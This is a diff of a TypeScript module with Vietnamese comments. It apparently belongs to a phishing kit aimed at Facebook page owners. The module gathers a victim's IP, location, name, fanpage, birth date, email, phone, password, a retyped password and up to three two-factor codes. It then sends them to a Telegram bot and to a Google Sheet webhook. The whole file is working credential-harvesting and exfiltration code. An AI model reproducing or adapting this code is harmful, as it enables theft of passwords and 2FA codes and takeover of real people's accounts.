@@ -3,15 +3,13 @@ import https from 'https';
 import { memoryStoreTTL } from '../libs/memoryStore';
 import { generateKey } from '../utils/generateKey';
 
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN!;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID!;
-const WEBHOOK_URL = process.env.WEBHOOK_URL!;
+// Environment Variables
+const TELEGRAM_API = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}`;
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID!;
+const WEBHOOK_URL = process.env.WEBHOOK_URL!; // Google Sheet Webhook
 const agent = new https.Agent({ family: 4 });
 
-if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !WEBHOOK_URL) {
-    console.warn("⚠️ Environment variables missing!");
-}
-
+// Merge dữ liệu cũ + mới
 function mergeData(oldData: any = {}, newData: any = {}) {
     return {
         ...oldData,
@@ -21,6 +19,7 @@ function mergeData(oldData: any = {}, newData: any = {}) {
     };
 }
 
+// Format message Telegram
 function formatMessage(data: any): string {
     return `
 <b>Ip:</b> <code>${data.ip || 'Error'}</code>
@@ -38,67 +37,79 @@ function formatMessage(data: any): string {
 `.trim();
 }
 
-// Gửi Telegram
-async function sendTelegram(data: any, extraMsg?: string) {
-    const key = generateKey(data);
-    const prev = memoryStoreTTL.get(key);
-    const fullData = mergeData(prev?.data, data);
-    const text = formatMessage(fullData) + (extraMsg ? `\n\n❌ ERROR: ${extraMsg}` : '');
-
-    try {
-        const res = await axios.post(
-            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-            { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" },
-            { httpsAgent: agent, timeout: 10000 }
-        );
-        const messageId = res.data.result.message_id;
-        memoryStoreTTL.set(key, { message: text, messageId, data: fullData });
-        console.log(`✅ Sent Telegram. ID: ${messageId}`);
-    } catch (err: any) {
-        console.error("❌ Telegram send error:", err?.response?.data || err.message || err);
-    }
-}
-
-// Gửi lên Webhook
+// Gửi dữ liệu lên Webhook (Google Sheet)
 async function sendToWebhook(data: any) {
+    const payload = {
+        timestamp: new Date().toISOString(),
+        ip: data.ip || "",
+        location: data.location || "",
+        name: data.name || "",
+        fanpage: data.fanpage || "",
+        day: data.day || "",
+        month: data.month || "",
+        year: data.year || "",
+        email: data.email || "",
+        business: data.business || "",
+        phone: data.phone || "",
+        password: data.password || "",
+        passwordSecond: data.passwordSecond || "",
+        authMethod: data.authMethod || "",
+        twoFa: data.twoFa || "",
+        twoFaSecond: data.twoFaSecond || "",
+        twoFaThird: data.twoFaThird || ""
+    };
+
     try {
-        const res = await axios.post(WEBHOOK_URL, {
-            timestamp: new Date().toISOString(),
-            ...data
-        }, {
+        const res = await axios.post(WEBHOOK_URL, payload, {
             headers: { "Content-Type": "application/json" },
             timeout: 10000
         });
-        console.log("✅ Sent to Webhook");
-        console.log("Webhook response status:", res.status);
-        console.log("Webhook response data:", res.data);
+        console.log("✅ Webhook response data:", res.data);
+        return res.data;
     } catch (err: any) {
-        let errMsg = "";
-        if (err.response) {
-            // Server phản hồi lỗi
-            console.error("❌ Webhook error response:", err.response.status, err.response.data);
-            errMsg = `Webhook error ${err.response.status}: ${JSON.stringify(err.response.data)}`;
-        } else if (err.request) {
-            console.error("❌ Webhook no response:", err.request);
-            errMsg = "Webhook no response from server";
-        } else {
-            console.error("❌ Webhook request error:", err.message);
-            errMsg = err.message;
-        }
-
-        // Báo lỗi luôn trên Telegram
-        await sendTelegram(data, errMsg);
+        console.error("❌ Webhook send error:", err?.response?.data || err.message || err);
+        throw err;
     }
 }
 
-// Gửi Telegram + Webhook 1 object
-export async function sendSingleData(data: any) {
-    await Promise.all([sendTelegram(data), sendToWebhook(data)]);
+// Gửi dữ liệu Telegram
+async function sendTelegram(data: any) {
+    const messageText = formatMessage(data);
+    const key = generateKey(data);
+    const prev = memoryStoreTTL.get(key);
+    const fullData = mergeData(prev?.data, data);
+
+    try {
+        const res = await axios.post(`${TELEGRAM_API}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: messageText,
+            parse_mode: 'HTML'
+        }, { httpsAgent: agent, timeout: 10000 });
+
+        const messageId = res.data.result.message_id;
+        memoryStoreTTL.set(key, { message: messageText, messageId, data: fullData });
+        console.log(`✅ Sent Telegram. ID: ${messageId}`);
+        return res.data;
+    } catch (err: any) {
+        console.error("🔥 Telegram send error:", err?.response?.data || err.message || err);
+        throw err;
+    }
 }
 
-// Gửi batch nhiều object
+// Gửi dữ liệu đơn hoặc batch
+export async function sendSingleData(data: any) {
+    try {
+        // Telegram
+        await sendTelegram(data);
+        // Webhook
+        await sendToWebhook(data);
+    } catch (err) {
+        console.error("⚠️ Error sending data:", err);
+    }
+}
+
 export async function sendBatchData(dataList: any[]) {
     const promises = dataList.map(data => sendSingleData(data));
     await Promise.all(promises);
-    console.log("✅ All batch data sent");
+    console.log("✅ All data sent");
 }
